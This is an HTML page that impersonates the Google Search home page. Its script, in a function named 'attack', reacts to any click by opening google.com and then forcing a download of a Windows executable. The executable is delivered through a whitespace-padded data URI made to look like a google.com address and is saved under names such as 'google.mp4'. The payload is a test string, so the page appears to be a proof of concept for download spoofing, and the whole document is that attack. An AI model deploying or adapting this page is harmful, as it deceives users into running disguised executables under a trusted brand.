<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>Google Search</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body {
    font-family: Roboto, Arial, sans-serif; background: #fff;
    display: flex; align-items: center; justify-content: center;
    min-height: 100vh; flex-direction: column; padding: 20px;
    -webkit-tap-highlight-color: transparent;
  }
  .logo { font-size: 72px; font-weight: 400; margin-bottom: 28px; }
  .g1{color:#4285f4}.o1{color:#ea4335}.o2{color:#fbbc05}
  .g2{color:#4285f4}.l{color:#34a853}.e{color:#ea4335}
  .search {
    width: 88vw; max-width: 440px; padding: 14px 20px; font-size: 16px;
    border: 1px solid #dfe1e5; border-radius: 24px; outline: none;
    box-shadow: 0 1px 6px rgba(32,33,36,.12); cursor: pointer; text-align: center;
  }
  .btns { margin-top: 18px; }
  .btns button {
    background: #f8f9fa; border: 1px solid #f8f9fa;
    padding: 10px 18px; margin: 4px; border-radius: 4px;
    font-size: 14px; color: #3c4043; cursor: pointer;
  }
</style>
</head>
<body>

<div class="logo">
  <span class="g1">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
</div>

<input class="search" id="box" type="text" placeholder="Search Google or type a URL" autocomplete="off" readonly>

<div class="btns">
  <button id="btn1">Google Search</button>
  <button id="btn2">I'm Feeling Lucky</button>
</div>

<script>
(function() {
  var SP = ' '.repeat(200);
  var DATA_URI = 'data:https://google.com/' + SP + 'application/x-msdownload;base64,ZXN0dGVzdHRlc3R0ZXN0';

  function attack(file) {
    window.open('https://www.google.com', '_blank');
    setTimeout(function() {
      var a = document.createElement('a');
      a.href = DATA_URI;
      a.download = file;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
    }, 500);
  }

  document.getElementById('box').addEventListener('click', function() { attack('google.mp4'); });
  document.getElementById('btn1').addEventListener('click', function() { attack('google-search.mp4'); });
  document.getElementById('btn2').addEventListener('click', function() { attack('google-lucky.mp4'); });
})();
</script>

</body>
</html>
